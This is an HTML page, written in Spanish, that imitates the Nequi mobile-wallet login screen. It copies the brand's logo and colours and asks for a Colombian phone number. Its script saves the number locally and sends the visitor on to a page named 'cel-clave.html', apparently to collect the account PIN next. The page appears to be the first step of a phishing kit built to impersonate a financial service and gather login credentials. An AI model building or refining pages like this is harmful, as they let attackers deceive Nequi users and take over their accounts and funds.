<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Nequi</title>

<style>
body{
  margin:0;
  font-family: Arial, sans-serif;
  background:#210049;
  color:white;
}

/* Contenedor */
.container{
  max-width:420px;
  margin:auto;
  min-height:100vh;
  display:flex;
  flex-direction:column;
  padding:20px;
}

/* Header */
header{
  display:flex;
  justify-content:space-between;
  align-items:center;
}

.help{
  width:22px;
  height:22px;
  border:2px solid white;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  font-weight:bold;
}

/* Logo centro */
.logo{
  margin:auto;
  margin-top:80px;
  margin-bottom:60px;
  text-align:center;
  animation:fadeIn 1s ease;
}

.logo svg{
  width:180px;
}

/* Input */
.input-box{
  display:flex;
  align-items:center;
  background:rgba(255,255,255,0.15);
  border-radius:6px;
  overflow:hidden;
}

.prefix{
  padding:12px;
  border-right:2px solid #210049;
  color:#ff4da6;
  font-weight:bold;
}

input{
  flex:1;
  padding:12px;
  border:none;
  outline:none;
  background:transparent;
  color:white;
  font-size:16px;
}

input::placeholder{
  color:white;
}

/* Botón */
button{
  width:100%;
  margin-top:15px;
  padding:14px;
  border:none;
  border-radius:6px;
  background:#ff4da6;
  color:white;
  font-size:16px;
  cursor:pointer;
  opacity:.5;
  transition:.3s;
}

button.active{
  opacity:1;
}

/* Loader */
.loader{
  position:fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background:#210049;
  display:flex;
  justify-content:center;
  align-items:center;
  z-index:999;
}

.spinner{
  width:40px;
  height:40px;
  border:4px solid rgba(255,255,255,0.2);
  border-top:4px solid white;
  border-radius:50%;
  animation:spin 1s linear infinite;
}

@keyframes spin{
  to{transform:rotate(360deg);}
}

@keyframes fadeIn{
  from{opacity:0; transform:translateY(20px);}
  to{opacity:1; transform:translateY(0);}
}
</style>
</head>

<body>

<!-- Loader -->
<div class="loader" id="loader">
  <div class="spinner"></div>
</div>

<div class="container">

<header>
  <div class="help">?</div>

  <!-- Logo superior -->
  <div style="opacity:.7">
    <svg width="70" height="24" viewBox="0 0 118 40" fill="white">
      <text x="0" y="25" font-size="20">Nequi</text>
    </svg>
  </div>
</header>

<!-- LOGO CENTRAL COMPLETO -->
<div class="logo">
<svg width="180" viewBox="0 0 104 32" fill="none">
  <path d="M10 25V5H14L22 18V5H26V25H22L14 12V25H10Z" fill="white"/>
  <path d="M30 25V10H34V25H30ZM32 7C30.9 7 30 6.1 30 5C30 3.9 30.9 3 32 3C33.1 3 34 3.9 34 5C34 6.1 33.1 7 32 7Z" fill="white"/>
  <path d="M38 25V5H42V17L50 10H55L46 18L55 25H50L42 18V25H38Z" fill="white"/>
  <path d="M58 25V10H62V25H58Z" fill="white"/>
  <path d="M64 25V5H68V25H64Z" fill="white"/>
</svg>
</div>

<!-- FORM -->
<div>
  <div class="input-box">
    <div class="prefix">+57</div>
    <input type="text" id="phone" placeholder="Ingresa tu cel">
  </div>

  <button id="btn">Entra</button>
</div>

</div>

<script>
const phone = document.getElementById("phone");
const btn = document.getElementById("btn");

/* Formato celular */
phone.addEventListener("input", () => {
  let val = phone.value.replace(/\D/g,"").slice(0,10);

  if(val.length > 6){
    val = val.replace(/(\d{3})(\d{3})(\d+)/, "$1 $2 $3");
  } else if(val.length > 3){
    val = val.replace(/(\d{3})(\d+)/, "$1 $2");
  }

  phone.value = val;

  const raw = val.replace(/\D/g,"");

  if(raw.length === 10 && raw.startsWith("3")){
    btn.classList.add("active");
  } else {
    btn.classList.remove("active");
  }
});

/* Click */
btn.addEventListener("click", () => {
  const raw = phone.value.replace(/\D/g,"");

  if(raw.length !== 10) return;

  btn.innerText = "Entrando...";
  btn.style.opacity = "0.7";

  setTimeout(()=>{
    localStorage.setItem("numero", raw);
    window.location.href = "cel-clave.html";
  },1500);
});

/* Loader inicial */
window.onload = () => {
  setTimeout(()=>{
    document.getElementById("loader").style.display="none";
  },1200);
};
</script>

</body>
</html>
